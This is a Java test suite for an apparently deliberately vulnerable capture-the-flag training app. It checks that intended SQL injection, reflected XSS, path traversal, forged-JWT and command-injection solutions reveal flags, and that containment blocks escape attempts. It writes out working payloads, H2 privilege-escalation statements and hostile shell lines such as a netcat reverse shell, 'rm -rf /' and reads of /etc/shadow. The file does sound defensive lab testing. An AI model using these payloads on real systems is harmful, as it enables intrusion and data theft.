package dev.santiagosantofimio.breachroom.rooms;

import static org.hamcrest.Matchers.containsString;
import static org.hamcrest.Matchers.hasSize;
import static org.hamcrest.Matchers.lessThanOrEqualTo;
import static org.hamcrest.Matchers.not;
import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertThrows;
import static org.junit.jupiter.api.Assertions.assertTrue;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.get;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.post;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.content;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.header;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.jsonPath;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.status;

import com.jayway.jsonpath.JsonPath;
import dev.santiagosantofimio.breachroom.flag.FlagService;
import dev.santiagosantofimio.breachroom.rooms.sqli.DirectoryDatabase;
import dev.santiagosantofimio.breachroom.security.HmacSha256;
import dev.santiagosantofimio.breachroom.session.SessionFilter;
import dev.santiagosantofimio.breachroom.session.SessionTokens;
import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.sql.Connection;
import java.sql.SQLException;
import java.sql.Statement;
import java.time.Duration;
import java.time.Instant;
import java.util.Base64;
import java.util.List;
import java.util.Set;
import java.util.stream.Stream;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Nested;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.boot.webmvc.test.autoconfigure.AutoConfigureMockMvc;
import org.springframework.http.MediaType;
import org.springframework.test.context.ActiveProfiles;
import org.springframework.test.web.servlet.MockMvc;
import org.springframework.test.web.servlet.ResultActions;
import org.springframework.test.web.servlet.request.MockHttpServletRequestBuilder;

@SpringBootTest
@AutoConfigureMockMvc
@ActiveProfiles("test")
class ContainmentApiTest {

    private static final String FLAG_PREFIX = "BREACH{";
    private static final String SANDBOX_POLICY =
            "sandbox allow-scripts; default-src 'none'; script-src 'unsafe-inline'; "
                    + "style-src 'unsafe-inline'; img-src data:";
    private static final Set<Integer> PRIVILEGE_ERROR_CODES = Set.of(90040, 90096);
    private static final List<String> FORBIDDEN_IN_SOURCE = List.of(
            "ProcessBuilder",
            "Runtime.getRuntime",
            "ObjectInputStream",
            "java.io.File",
            "java.nio.file",
            "java.net.http",
            "HttpURLConnection",
            "RestClient",
            "RestTemplate",
            "WebClient",
            "Class.forName",
            "getDeclaredMethod",
            "thymeleaf",
            "freemarker",
            "ScriptEngine");

    @Autowired
    private MockMvc mvc;

    @Autowired
    private FlagService flags;

    @Autowired
    private SessionTokens tokens;

    @Autowired
    private DirectoryDatabase directory;

    private String token;

    @BeforeEach
    void openSession() {
        token = tokens.issue();
    }

    private String flagOf(RoomSlug room) {
        return flags.flagFor(tokens.verify(token).orElseThrow(), room);
    }

    private ResultActions send(MockHttpServletRequestBuilder request) throws Exception {
        return mvc.perform(request.header(SessionFilter.SESSION_HEADER, token));
    }

    private ResultActions searchFor(String term) throws Exception {
        return send(get("/api/rooms/sqli/employees").param("search", term));
    }

    private void runAsPlayer(String sql) throws SQLException {
        try (Connection connection = directory.playerConnections().getConnection();
                Statement statement = connection.createStatement()) {
            statement.execute(sql);
        }
    }

    @Nested
    class DirectoryRoom {

        @Test
        void unionSelectReadsTheVault() throws Exception {
            searchFor("' UNION SELECT id, label, secret FROM vault -- ")
                    .andExpect(status().isOk())
                    .andExpect(content().string(containsString(flagOf(RoomSlug.SQLI))));
        }

        @Test
        void normalSearchDoesNotRevealTheFlag() throws Exception {
            searchFor("Quill")
                    .andExpect(status().isOk())
                    .andExpect(jsonPath("$.count").value(1))
                    .andExpect(jsonPath("$.results[0].department").value("Internal Morale"))
                    .andExpect(content().string(not(containsString(FLAG_PREFIX))));
        }

        @Test
        void brokenQueryExplainsItselfWithoutRevealingTheFlag() throws Exception {
            searchFor("'")
                    .andExpect(status().isBadRequest())
                    .andExpect(jsonPath("$.error").value("query_failed"))
                    .andExpect(content().string(not(containsString(FLAG_PREFIX))));
        }

        @ParameterizedTest
        @ValueSource(strings = {
            "CREATE ALIAS RUN_ME AS 'String run() { return \"x\"; }'",
            "SELECT FILE_READ('/etc/hosts')",
            "SELECT FILE_WRITE('x', '/tmp/breach-room-containment')",
            "SELECT * FROM CSVREAD('/etc/hosts')",
            "CALL CSVWRITE('/tmp/breach-room-containment', 'SELECT 1')",
            "SELECT * FROM LINK_SCHEMA('X', '', 'jdbc:h2:mem:other', 'sa', '', 'PUBLIC')",
            "RUNSCRIPT FROM '/tmp/breach-room-containment'",
            "DROP TABLE vault",
            "DROP ALL OBJECTS",
            "INSERT INTO vault (id, label, secret) VALUES (9, 'x', 'y')",
            "UPDATE vault SET secret = 'x'",
            "DELETE FROM vault",
            "CREATE TABLE stolen (id INT)",
            "CREATE USER intruder PASSWORD 'x' ADMIN",
            "GRANT ALL ON vault TO player",
            "ALTER USER player ADMIN TRUE",
            "SCRIPT TO '/tmp/breach-room-containment'",
            "BACKUP TO '/tmp/breach-room-containment'",
            "SHUTDOWN"
        })
        void playerAccountCannotEscapeItsTables(String statement) {
            SQLException refusal = assertThrows(SQLException.class, () -> runAsPlayer(statement), statement);

            assertTrue(
                    PRIVILEGE_ERROR_CODES.contains(refusal.getErrorCode()),
                    statement + " failed for another reason: " + refusal.getMessage());
            assertFalse(Files.exists(Path.of("/tmp/breach-room-containment")), statement);
        }

        @Test
        void playerCanStillReadItsOwnTables() throws SQLException {
            runAsPlayer("SELECT COUNT(*) FROM employees");
        }

        @Test
        void fileFunctionsFailThroughTheVulnerableEndpointToo() throws Exception {
            searchFor("' UNION SELECT 1, FILE_READ('/etc/hosts'), 'x' -- ")
                    .andExpect(status().isBadRequest())
                    .andExpect(jsonPath("$.error").value("query_failed"));
        }

        @Test
        void stackedStatementsAreRefused() throws Exception {
            searchFor("'; SET QUERY_TIMEOUT 0; SELECT 1, 'a', 'b' -- ")
                    .andExpect(status().isBadRequest())
                    .andExpect(jsonPath("$.error").value("search_rejected"));
        }

        @ParameterizedTest
        @ValueSource(strings = {
            "' UNION SELECT 1, SPACE(1000000000), 'b' -- ",
            "' UNION SELECT 1, repeat('x', 300000000), 'b' -- ",
            "' UNION SELECT 1, RPAD ('x', 300000000), 'b' -- ",
            "' UNION SELECT 1, LPAD('x', 300000000), 'b' -- ",
            "' UNION SELECT 1, SECURE_RAND(1000000000), 'b' -- "
        })
        void memoryHeavyFunctionsAreRefused(String term) throws Exception {
            searchFor(term)
                    .andExpect(status().isBadRequest())
                    .andExpect(jsonPath("$.error").value("search_rejected"));
        }

        @Test
        void oversizedSearchIsRefused() throws Exception {
            searchFor("x".repeat(201))
                    .andExpect(status().isBadRequest())
                    .andExpect(jsonPath("$.error").value("search_rejected"));
        }

        @Test
        void resultsAreCappedAtFiftyRows() throws Exception {
            searchFor("' UNION SELECT X, 'a', 'b' FROM SYSTEM_RANGE(1, 1000) -- ")
                    .andExpect(status().isOk())
                    .andExpect(jsonPath("$.results", hasSize(lessThanOrEqualTo(50))));
        }

        @Test
        void hugeValuesAreCutInTheResponse() throws Exception {
            searchFor("' UNION SELECT 1, LISTAGG(X), 'b' FROM SYSTEM_RANGE(1, 1000) -- ")
                    .andExpect(status().isOk())
                    .andExpect(jsonPath("$.results[0].name").value(org.hamcrest.Matchers.hasLength(200)));
        }

        @Test
        void slowQueryIsCutOffByTheTimeout() throws Exception {
            Instant start = Instant.now();

            searchFor("' UNION SELECT COUNT(*), 'a', 'b' FROM SYSTEM_RANGE(1, 2000000000) A, SYSTEM_RANGE(1, 2000000000) B -- ")
                    .andExpect(status().isBadRequest())
                    .andExpect(jsonPath("$.error").value("query_failed"));

            assertTrue(Duration.between(start, Instant.now()).compareTo(Duration.ofSeconds(5)) < 0);
        }
    }

    @Nested
    class MailboxRoom {

        @Test
        void subjectIsReflectedWithoutEscaping() throws Exception {
            mvc.perform(get("/api/rooms/xss/inbox").param("subject", "<img src=x onerror=alert(1)>"))
                    .andExpect(status().isOk())
                    .andExpect(content().contentTypeCompatibleWith("text/html"))
                    .andExpect(content().string(containsString("<img src=x onerror=alert(1)>")));
        }

        @Test
        void documentIsServedInsideTheExactSandbox() throws Exception {
            mvc.perform(get("/api/rooms/xss/inbox"))
                    .andExpect(header().string("Content-Security-Policy", SANDBOX_POLICY))
                    .andExpect(header().doesNotExist("X-Frame-Options"))
                    .andExpect(header().string("X-Content-Type-Options", "nosniff"));
        }

        @Test
        void documentNeverCarriesTheFlag() throws Exception {
            mvc.perform(get("/api/rooms/xss/inbox").param("subject", "<script>alert(1)</script>"))
                    .andExpect(content().string(not(containsString(FLAG_PREFIX))));
        }

        @Test
        void onlyTheExactDocumentPathSkipsTheSession() throws Exception {
            mvc.perform(get("/api/rooms/xss/inbox/")).andExpect(status().isUnauthorized());
            mvc.perform(post("/api/rooms/xss/proof")).andExpect(status().isUnauthorized());
        }

        @Test
        void otherRoutesKeepTheLockedDownPolicy() throws Exception {
            send(get("/api/rooms/recon/"))
                    .andExpect(header().string("X-Frame-Options", "DENY"))
                    .andExpect(header().string(
                            "Content-Security-Policy",
                            containsString("frame-ancestors 'none'")));
        }

        @Test
        void proofWithASessionReturnsTheFlag() throws Exception {
            send(post("/api/rooms/xss/proof"))
                    .andExpect(status().isOk())
                    .andExpect(jsonPath("$.flag").value(flagOf(RoomSlug.XSS)));
        }
    }

    @Nested
    class BackupsRoom {

        private ResultActions download(String file) throws Exception {
            return send(get("/api/rooms/traversal/download").param("file", file));
        }

        @Test
        void traversalReachesTheVirtualKey() throws Exception {
            download("../../../vault/backup.key")
                    .andExpect(status().isOk())
                    .andExpect(content().string(containsString(flagOf(RoomSlug.TRAVERSAL))));
        }

        @Test
        void publicFilesDoNotRevealTheFlag() throws Exception {
            download("readme.txt")
                    .andExpect(status().isOk())
                    .andExpect(content().string(containsString("/vault/backup.key")))
                    .andExpect(content().string(not(containsString(FLAG_PREFIX))));
            send(get("/api/rooms/traversal/"))
                    .andExpect(status().isOk())
                    .andExpect(content().string(not(containsString(FLAG_PREFIX))));
        }

        @ParameterizedTest
        @ValueSource(strings = {
            "../../../../etc/passwd",
            "../../../../etc/hosts",
            "../../../../proc/self/environ",
            "../../../../app/app.jsa",
            "../../../../"
        })
        void realFilesOfTheHostAreOutOfReach(String path) throws Exception {
            download(path)
                    .andExpect(status().isNotFound())
                    .andExpect(content().string("No such file.\n"));
        }

        @Test
        void climbingPastTheRootStaysInsideTheVirtualTree() {
            assertEquals("/vault/backup.key", VirtualFileSystem.normalize("/a/../../../vault/./backup.key"));
        }
    }

    @Nested
    class AccessControlRoom {

        private static final String UNSIGNED_HEADER = "eyJhbGciOiJub25lIn0";

        private String encoded(String json) {
            return Base64.getUrlEncoder().withoutPadding().encodeToString(json.getBytes(StandardCharsets.UTF_8));
        }

        private String issuedToken() throws Exception {
            String body = send(get("/api/rooms/jwt/badge")).andReturn().getResponse().getContentAsString();
            return JsonPath.read(body, "$.token");
        }

        private ResultActions openDoor(String token) throws Exception {
            return send(get("/api/rooms/jwt/door").header("Authorization", "Bearer " + token));
        }

        @Test
        void unsignedTokenOpensTheDoor() throws Exception {
            openDoor(UNSIGNED_HEADER + "." + encoded("{\"sub\":\"x\",\"role\":\"director\"}") + ".")
                    .andExpect(status().isOk())
                    .andExpect(content().string(containsString(flagOf(RoomSlug.JWT))));
        }

        @Test
        void tokenForgedWithTheWeakSecretOpensTheDoor() throws Exception {
            String signedPart = encoded("{\"alg\":\"HS256\"}") + "." + encoded("{\"role\":\"director\"}");
            String signature = Base64.getUrlEncoder().withoutPadding().encodeToString(
                    HmacSha256.sign("kryptelia2019", signedPart.getBytes(StandardCharsets.UTF_8)));

            openDoor(signedPart + "." + signature)
                    .andExpect(status().isOk())
                    .andExpect(content().string(containsString(flagOf(RoomSlug.JWT))));
        }

        @Test
        void issuedBadgeIsTurnedAwayWithoutTheFlag() throws Exception {
            openDoor(issuedToken())
                    .andExpect(status().isForbidden())
                    .andExpect(content().string(not(containsString(FLAG_PREFIX))));
        }

        @Test
        void editingTheRoleBreaksTheSignature() throws Exception {
            String[] parts = issuedToken().split("\\.");

            openDoor(parts[0] + "." + encoded("{\"role\":\"director\"}") + "." + parts[2])
                    .andExpect(status().isUnauthorized());
        }

        @Test
        void unknownAlgorithmsAreRefused() throws Exception {
            openDoor(encoded("{\"alg\":\"RS256\"}") + "." + encoded("{\"role\":\"director\"}") + ".")
                    .andExpect(status().isUnauthorized());
        }

        @ParameterizedTest
        @ValueSource(strings = {"nonsense", "a.b", "a.b.c", "%%%.%%%.%%%"})
        void malformedTokensAreRefused(String token) throws Exception {
            openDoor(token).andExpect(status().isUnauthorized());
        }

        @Test
        void doorRequiresABadge() throws Exception {
            send(get("/api/rooms/jwt/door")).andExpect(status().isUnauthorized());
        }
    }

    @Nested
    class DiagnosticsRoom {

        private ResultActions ping(String host) throws Exception {
            return send(post("/api/rooms/cmdinjection/ping")
                    .contentType(MediaType.APPLICATION_JSON)
                    .content("{\"host\":" + quoted(host) + "}"));
        }

        private String quoted(String text) {
            return "\"" + text.replace("\\", "\\\\").replace("\"", "\\\"") + "\"";
        }

        @ParameterizedTest
        @ValueSource(strings = {
            "127.0.0.1; cat /vault/escape.key",
            "127.0.0.1 && cat /vault/escape.key",
            "127.0.0.1 | cat /vault/escape.key",
            "127.0.0.1;cat ../../vault/escape.key"
        })
        void chainedCommandReadsTheEscapeKey(String host) throws Exception {
            ping(host)
                    .andExpect(status().isOk())
                    .andExpect(jsonPath("$.output").value(containsString(flagOf(RoomSlug.CMDINJECTION))));
        }

        @Test
        void normalPingDoesNotRevealTheFlag() throws Exception {
            ping("127.0.0.1")
                    .andExpect(status().isOk())
                    .andExpect(jsonPath("$.output").value(containsString("3 packets transmitted")))
                    .andExpect(content().string(not(containsString(FLAG_PREFIX))));
        }

        @Test
        void simulatedCommandsAnswerLikeAShell() throws Exception {
            ping("x; whoami; id; pwd; ls; ls /vault")
                    .andExpect(jsonPath("$.output").value(containsString("uid=1000(diag)")))
                    .andExpect(jsonPath("$.output").value(containsString("/home/diag")))
                    .andExpect(jsonPath("$.output").value(containsString("notes.txt")))
                    .andExpect(jsonPath("$.output").value(containsString("escape.key")));
        }

        @Test
        void conditionalChainStopsAfterAFailure() throws Exception {
            ping("x; cat /missing && whoami")
                    .andExpect(jsonPath("$.output").value(containsString("No such file")))
                    .andExpect(jsonPath("$.output").value(not(containsString("diag\n"))));
        }

        @ParameterizedTest
        @ValueSource(strings = {
            "x; rm -rf /",
            "x; curl https://example.org",
            "x; wget https://example.org",
            "x; nc -e /bin/sh example.org 4444",
            "x; bash -c id",
            "x; sh",
            "x; python3 -c print",
            "x; java -version",
            "x; env",
            "x; printenv",
            "x; /bin/cat /etc/passwd",
            "x; `whoami`",
            "x; $(whoami)"
        })
        void anythingOutsideTheFakeCommandsIsNotFound(String host) throws Exception {
            ping(host)
                    .andExpect(status().isOk())
                    .andExpect(jsonPath("$.output").value(containsString("command not found")));
        }

        @Test
        void commandSubstitutionIsNotInterpreted() throws Exception {
            ping("$(whoami)")
                    .andExpect(jsonPath("$.output").value(containsString("PING $(whoami):")));
        }

        @ParameterizedTest
        @ValueSource(strings = {"/proc/self/environ", "/app/app.jsa", "/etc/shadow", "/etc/hosts"})
        void realFilesOfTheHostAreOutOfReach(String path) throws Exception {
            ping("x; cat " + path)
                    .andExpect(jsonPath("$.output").value(containsString("No such file or directory")));
        }

        @Test
        void fakePasswdIsTheOnlyPasswd() throws Exception {
            ping("x; cat /etc/passwd")
                    .andExpect(jsonPath("$.output").value(containsString("root:x:0:0:Facilities")));
        }

        @Test
        void longCommandChainsAreCut() throws Exception {
            ping("x" + "; whoami".repeat(22))
                    .andExpect(status().isOk())
                    .andExpect(result -> assertEquals(
                            10,
                            JsonPath.<String>read(result.getResponse().getContentAsString(), "$.output")
                                    .split("diag", -1).length));
        }

        @Test
        void oversizedOrMissingHostIsRefused() throws Exception {
            ping("x".repeat(201)).andExpect(status().isBadRequest());
            send(post("/api/rooms/cmdinjection/ping")
                            .contentType(MediaType.APPLICATION_JSON)
                            .content("{}"))
                    .andExpect(status().isBadRequest());
        }

        @Test
        void indexDoesNotRevealTheFlag() throws Exception {
            send(get("/api/rooms/cmdinjection/"))
                    .andExpect(status().isOk())
                    .andExpect(content().string(not(containsString(FLAG_PREFIX))));
        }
    }

    @Test
    void forbiddenApisDoNotAppearInTheBackend() throws IOException {
        try (Stream<Path> sources = Files.walk(Path.of("src/main/java"))) {
            for (Path source : sources.filter(path -> path.toString().endsWith(".java")).toList()) {
                String code = Files.readString(source);
                for (String forbidden : FORBIDDEN_IN_SOURCE) {
                    assertFalse(code.contains(forbidden), forbidden + " found in " + source);
                }
            }
        }
    }
}
